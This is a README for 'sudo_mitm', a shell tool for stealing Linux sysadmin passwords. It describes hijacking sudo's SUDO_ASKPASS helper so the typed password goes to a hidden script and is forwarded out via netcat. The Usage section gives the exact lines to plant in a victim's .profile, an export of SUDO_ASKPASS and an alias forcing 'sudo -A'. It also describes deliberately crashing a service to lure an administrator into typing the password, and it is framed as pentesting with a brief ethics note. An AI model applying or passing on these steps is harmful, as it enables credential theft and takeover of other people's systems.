# sudo_mitm #

A simple tool for harvesting sysadmin credentials in Linux

**Overview**

This is a simple shell script that takes advantage of the SUDO\_ASKPASS functionallity in _sudo_ to grab a target users password and forward it on with the help of netcat. From the _sudo_ man page:

	Normally, if sudo requires a password, it will read it from the user's terminal. If the -A 
	(askpass) option is specified, a (possibly graphical) helper program is executed to read the 
	user's password and output the password to the standard output. If the SUDO_ASKPASS environment
	variable is set, it specifies the path to the helper program.

**Pre-requisite**

This tool requires the ability to write to the target users home directory.

**Usage**

Set the following alias and env variable in one of the users startup scripts, such as the .profile file:

	export SUDO_ASKPASS="$HOME/.sudo_mitm.sh"
	alias sudo='sudo -A'
	
Then place the script on the system and wait for the user to log in. Make sure the script is in the same place the SUDO_ASKPASS variable was just set to.

During one pentest we purposfully downed a key service on the compromised host in order to force the sysadmin to login and use sudo to restart it. Compromising a system on the network is nice. Compromising the sysadmins credentials themselves is even better.

## A Quick Note on Ethics ##

I write and release these tools with the intention of educating the larger [IT](http://en.wikipedia.org/wiki/Information_technology) community and empowering legitimate pentesters. If I can write these tools in my spare time, then rest assured that the dedicated malicious actors have already developed versions of their own.

